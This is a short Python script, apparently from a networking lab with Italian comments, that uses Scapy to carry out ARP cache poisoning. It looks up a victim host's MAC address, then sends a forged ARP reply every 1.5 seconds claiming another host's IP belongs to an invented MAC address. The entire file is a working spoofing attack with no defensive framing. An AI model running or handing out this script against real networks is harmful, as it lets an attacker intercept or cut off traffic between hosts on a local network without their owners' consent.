from scapy.all import *
import time



def get_mac(IP):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = 'eth0', inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def trick(victimIP, victimMAC, sourceIP, sourceMAC):
    p=(ARP(op = 2, pdst = victimIP, psrc = sourceIP, hwdst=victimMAC, hwsrc=sourceMAC))
    send(p)

victimIP='192.168.0.5' #host3 della rete
victimMAC=get_mac(victimIP)
sourceIP='192.168.0.3' #IP host1 
sourceMAC='a2:01:c1:3b:4c:1b' #inventato
#print(sourceMAC)

while 1:
    trick(victimIP,victimMAC,sourceIP,sourceMAC)
    time.sleep(1.5)